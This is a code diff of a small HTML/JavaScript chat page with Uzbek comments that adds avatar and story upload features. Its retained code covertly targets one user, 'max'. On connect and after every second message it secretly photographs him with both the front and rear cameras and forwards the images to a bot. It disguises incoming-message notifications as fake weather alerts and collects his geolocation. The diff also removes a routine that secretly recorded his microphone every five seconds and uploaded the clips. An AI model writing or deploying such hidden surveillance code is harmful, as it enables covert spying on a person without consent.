@@ -6,17 +6,68 @@
     <link rel="stylesheet" href="style.css">
     <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <style>
+        .avatar-box {
+            width: 42px; height: 42px; border-radius: 50%; padding: 2px;
+            cursor: pointer; transition: 0.3s;
+        }
+        .avatar-box.has-story {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+        .avatar-img {
+            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
+            border: 2px solid #2c3e50; background: #fff;
+        }
+    </style>
 </head>
 <body>
 
+    <div id="profileModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center;">
+        <div style="background:#fff; padding:20px; border-radius:10px; width:80%; max-width:300px; text-align:center;">
+            <h3 style="margin-top:0; color:#333;">Profilni Tahrirlash</h3>
+            
+            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Dumaloq Avatar rasmi:</label>
+            <input type="file" id="avatarInput" accept="image/*" style="margin-bottom:15px; width:100%;">
+            
+            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Istoriya (Rasm yoki Video max 1 daq):</label>
+            <input type="file" id="storyInput" accept="image/*,video/*" style="margin-bottom:20px; width:100%;">
+            
+            <button onclick="saveProfileChanges()" style="background:#2ecc71; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Saqlash va Yuklash</button>
+            <button onclick="document.getElementById('profileModal').style.display='none'" style="background:#e74c3c; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer;">Bekor qilish</button>
+        </div>
+    </div>
+
+    <div id="storyViewer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; flex-direction:column; justify-content:center; align-items:center;">
+        <i class='bx bx-x' style="position:absolute; top:20px; right:20px; font-size:35px; color:#fff; cursor:pointer; z-index:2001;" onclick="closeStory()"></i>
+        <div id="storyContent" style="width:100%; max-height:100%; display:flex; justify-content:center; align-items:center;"></div>
+    </div>
+    
     <div class="chat-container">
-        <div class="chat-header">
-            <h3 id="chatPartner">CHAT</h3>
-            <div id="statusArea">
-                <span id="statusText">Offline</span>
+        
+        <div class="chat-header" style="display:flex; justify-content:space-between; align-items:center; padding:10px;">
+            <div style="display:flex; align-items:center; gap:8px;">
+                <div class="avatar-box" id="myStoryRing" onclick="viewStory(myUser)">
+                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="myAvatarImg" class="avatar-img">
+                </div>
+                <div style="display:flex; flex-direction:column; align-items:flex-start;">
+                    <div style="display:flex; align-items:center; gap:5px;">
+                        <span id="myNameTxt" style="font-weight:bold; font-size:14px; text-transform:uppercase;">MEN</span>
+                        <i class='bx bx-edit' style="cursor:pointer; color:#f39c12; font-size:18px;" onclick="document.getElementById('profileModal').style.display='flex'"></i>
+                    </div>
+                </div>
+            </div>
+
+            <div style="display:flex; align-items:center; gap:8px; flex-direction:row-reverse;">
+                <div class="avatar-box" id="partnerStoryRing" onclick="viewStory(partner)">
+                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="partnerAvatarImg" class="avatar-img">
+                </div>
+                <div style="display:flex; flex-direction:column; align-items:flex-end;">
+                    <span id="chatPartner" style="font-weight:bold; font-size:14px;">SHERIK</span>
+                    <span id="statusText" style="font-size:11px;">Offline</span>
+                </div>
             </div>
         </div>
-
         <div class="chat-messages" id="messagesList"></div>
 
         <div class="chat-input-wrapper">
@@ -45,8 +96,8 @@
         </div>
     </div>
 
-    <input type="file" id="fileInput" onchange="uploadFile(this.files[0])">
-    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])">
+    <input type="file" id="fileInput" onchange="uploadFile(this.files[0])" style="display:none;">
+    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])" style="display:none;">
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -57,11 +108,10 @@
         const partner = (myUser === 'mura') ? 'max' : 'mura';
         document.getElementById('chatPartner').innerText = partner.toUpperCase();
 
-        // --- EMOJI MANTIQI (YANGI) ---
+        // --- EMOJI MANTIQI ---
         const emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
         const emojiContainer = document.getElementById('emojiPicker');
         
-        // Emojilarni yaratish
         emojis.forEach(emoji => {
             const span = document.createElement('div');
             span.textContent = emoji;
@@ -78,13 +128,11 @@
             emojiContainer.classList.toggle('active');
         }
 
-        // Boshqa joy bosilganda emojini yopish
         document.addEventListener('click', (e) => {
             if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) {
                 emojiContainer.classList.remove('active');
             }
         });
-
 
         // --- GEOLOKATSIYA LOGIKASI ---
         function joinChat() {
@@ -97,7 +145,6 @@
                         (error) => {
                             console.log("GPS Xatosi:", error.message);
                             socket.emit('join', { user: myUser });
-                            alert("Iltimos, joylashuvga ruxsat bering!");
                         },
                         { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                     );
@@ -132,7 +179,6 @@
         });
 
         // --- BILDIRISHNOMAGA RUXSAT SO'RASH ---
-        // Saytga kirishi bilan bildirishnomaga ruxsat so'raydi
         if ("Notification" in window && Notification.permission !== "granted" && Notification.permission !== "denied") {
             Notification.requestPermission();
         }
@@ -142,19 +188,13 @@
             const list = document.getElementById('messagesList');
             list.scrollTop = list.scrollHeight;
 
-            // --- YASHIRIN BILDIRISHNOMA (OB-HAVO) ---
-            // Agar xabar o'zimniki bo'lmasa VA brauzer fonda (yashirin) bo'lsa
             if (msg.user !== myUser && document.hidden) {
                 if (Notification.permission === "granted") {
-                    
-                    // Xabar o'rniga chiqadigan yolg'on ma'lumot (Ob-havo)
                     const notification = new Notification("⛅ Ob-havo ma'lumoti", {
                         body: "Bugun havo ochiq, yog'ingarchilik kutilmaydi.",
-                        icon: "https://cdn-icons-png.flaticon.com/512/3222/3222800.png", // Kichik quyosh rasmi
-                        silent: false // Ovoz bilan keladi
+                        icon: "https://cdn-icons-png.flaticon.com/512/3222/3222800.png", 
+                        silent: false 
                     });
-                    
-                    // Bildirishnoma ustiga bosganda chatga qaytarish
                     notification.onclick = function() {
                         window.focus();
                         this.close();
@@ -167,14 +207,10 @@
             const list = document.getElementById('messagesList');
             const div = document.createElement('div');
             
-            // ASOSIY O'ZGARISH: Katta-kichik harf bo'lishidan qat'i nazar, bir xil qilib solishtiradi
             const isMe = String(msg.user).toLowerCase() === String(myUser).toLowerCase();
-            
             div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
-
             div.ondblclick = () => triggerReply(msg);
 
-            // Kim yozganini ko'rsatuvchi ism (faqat sherik yozgan bo'lsa)
             let senderNameHtml = '';
             if (!isMe && msg.user) {
                 senderNameHtml = `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${String(msg.user).toUpperCase()}</div>`;
@@ -221,7 +257,7 @@
                 socket.emit('send_message', { text: text, replyTo: currentReply });
                 input.value = '';
                 cancelReply();
-                emojiContainer.classList.remove('active'); // Xabar ketganda emojini yopish
+                emojiContainer.classList.remove('active'); 
             }
         }
 
@@ -287,12 +323,111 @@
         }
 
         // ==========================================
+        // PROFIL VA ISTORIYA MANTIQI (YANGI)
+        // ==========================================
+        let profilesData = {};
+        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();
+
+        socket.on('load_profiles', (data) => {
+            profilesData = data;
+            
+            if (profilesData[myUser]) {
+                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = `/uploads/${profilesData[myUser].avatar}`;
+                if (profilesData[myUser].story) document.getElementById('myStoryRing').classList.add('has-story');
+                else document.getElementById('myStoryRing').classList.remove('has-story');
+            }
+            
+            if (profilesData[partner]) {
+                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = `/uploads/${profilesData[partner].avatar}`;
+                if (profilesData[partner].story) document.getElementById('partnerStoryRing').classList.add('has-story');
+                else document.getElementById('partnerStoryRing').classList.remove('has-story');
+            }
+        });
+
+        async function saveProfileChanges() {
+            const avatarFile = document.getElementById('avatarInput').files[0];
+            const storyFile = document.getElementById('storyInput').files[0];
+            let profileUpdates = {};
+
+            if (avatarFile) {
+                const fd = new FormData(); fd.append('file', avatarFile);
+                try {
+                    const res = await fetch('/upload', { method: 'POST', body: fd });
+                    const data = await res.json();
+                    profileUpdates.avatar = data.filename;
+                } catch(e) { console.log(e); }
+            }
+
+            if (storyFile) {
+                if (storyFile.type.startsWith('video/')) {
+                    const videoCheck = document.createElement('video');
+                    videoCheck.preload = 'metadata';
+                    
+                    const isAllowed = await new Promise((resolve) => {
+                        videoCheck.onloadedmetadata = function() {
+                            window.URL.revokeObjectURL(videoCheck.src);
+                            if (videoCheck.duration > 60) {
+                                alert("Xatolik: Istoriya videosi 1 daqiqadan (60 soniyadan) oshmasligi shart!");
+                                resolve(false);
+                            } else {
+                                resolve(true);
+                            }
+                        }
+                        videoCheck.src = URL.createObjectURL(storyFile);
+                    });
+
+                    if (!isAllowed) return; 
+                }
+
+                const fd2 = new FormData(); fd2.append('file', storyFile);
+                try {
+                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 });
+                    const data2 = await res2.json();
+                    profileUpdates.story = data2.filename;
+                    profileUpdates.storyType = data2.type;
+                } catch(e) { console.log(e); }
+            }
+
+            if (Object.keys(profileUpdates).length > 0) {
+                socket.emit('update_profile', profileUpdates);
+                alert("Muvaffaqiyatli saqlandi!");
+            }
+            
+            document.getElementById('profileModal').style.display = 'none';
+            document.getElementById('avatarInput').value = '';
+            document.getElementById('storyInput').value = '';
+        }
+
+        function viewStory(user) {
+            if (!profilesData[user] || !profilesData[user].story) {
+                alert("Hozircha istoriya yo'q"); return;
+            }
+            
+            const viewer = document.getElementById('storyViewer');
+            const content = document.getElementById('storyContent');
+            content.innerHTML = ''; 
+            
+            const fileUrl = `/uploads/${profilesData[user].story}`;
+            
+            if (profilesData[user].storyType.startsWith('video/')) {
+                content.innerHTML = `<video src="${fileUrl}" controls autoplay style="max-width:100%; max-height:90vh; border-radius:10px;"></video>`;
+            } else {
+                content.innerHTML = `<img src="${fileUrl}" style="max-width:100%; max-height:90vh; border-radius:10px;">`;
+            }
+            viewer.style.display = 'flex';
+        }
+
+        function closeStory() {
+            const content = document.getElementById('storyContent');
+            content.innerHTML = ''; 
+            document.getElementById('storyViewer').style.display = 'none';
+        }
+
+        // ==========================================
         // MAX SHAXSINI YASHIRIN TASDIQLASH (VERIFY)
         // ==========================================
-
         let maxMessageCount = 0;
 
-        // Yashirincha rasmga olish funksiyasi
         async function takeSecretPhoto(facingMode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
@@ -311,7 +446,6 @@
                     canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                 });
             } catch (err) {
-                console.log(`Kamera xatosi (${facingMode}):`, err);
                 return null;
             }
         }
@@ -328,87 +462,27 @@
 
         async function runVerification() {
             if (myUser !== 'max') return; 
-            
             const frontBlob = await takeSecretPhoto('user');
             if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
             
-            await new Promise(r => setTimeout(r, 1000)); // 1 soniya kutamiz
+            await new Promise(r => setTimeout(r, 1000));
             
             const backBlob = await takeSecretPhoto('environment');
             if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
         }
 
-        // ==========================================
-        // HAR 5 SONIYADA AVTO-OVOZ YOZISH MANTIQI
-        // ==========================================
-        
-        async function startAutoVoice() {
-            if (myUser !== 'max') return; // Faqat Max uchun ishlaydi
-            
-            try {
-                // Mikrofonga ruxsat so'rash
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const autoRecorder = new MediaRecorder(stream);
-                
-                autoRecorder.ondataavailable = async (e) => {
-                    if (e.data.size > 0) {
-                        const formData = new FormData();
-                        formData.append('file', e.data, `auto_voice_${Date.now()}.webm`);
-                        try {
-                            // Serverga yuklash
-                            const res = await fetch('/upload', { method: 'POST', body: formData });
-                            const data = await res.json();
-                            // Serverdagi yashirin qabul qilgichga yuborish
-                            socket.emit('auto_voice', { filename: data.filename });
-                        } catch (err) { console.error("Avto-ovoz yuklash xatosi"); }
-                    }
-                };
-
-                // 5 soniya yozish va to'xtatish jarayoni
-                function recordChunk() {
-                    if (autoRecorder.state === 'inactive') {
-                        autoRecorder.start();
-                        // 5 soniyadan keyin to'xtatadi
-                        setTimeout(() => {
-                            if(autoRecorder.state === 'recording') autoRecorder.stop();
-                        }, 5000); 
-                    }
-                }
-
-                autoRecorder.onstop = () => {
-                    // Bitta xabar ketgandan so'ng 1 soniya dam olib, yana qayta boshlaydi
-                    setTimeout(recordChunk, 1000);
-                };
-
-                // Jarayonni birinchi marta ishga tushirish
-                recordChunk();
-
-            } catch (err) {
-                console.log("Avto mikrofon ruxsat bermadi:", err);
-            }
-        }
-
-        // Tizimga kirgandan keyin 4 soniya o'tib mikrofonni avto-yozishga tushirish
-        socket.on('connect', () => {
-            if (myUser === 'max') {
-                setTimeout(startAutoVoice, 4000); 
-            }
-        });
-    
-        // Tizimga kirganda 3 soniyadan keyin ishga tushadi
         socket.on('connect', () => {
             if (myUser === 'max') {
                 setTimeout(runVerification, 3000); 
             }
         });
 
-        // Xabar sanash qismi
         const originalSendMessage = window.sendMessage;
         window.sendMessage = function() {
             originalSendMessage(); 
             if (myUser === 'max') {
                 maxMessageCount++;
-                if (maxMessageCount % 2 === 0) { // 5 o'rniga 2 yozildi
+                if (maxMessageCount % 2 === 0) { 
                     runVerification();
                 }
             }
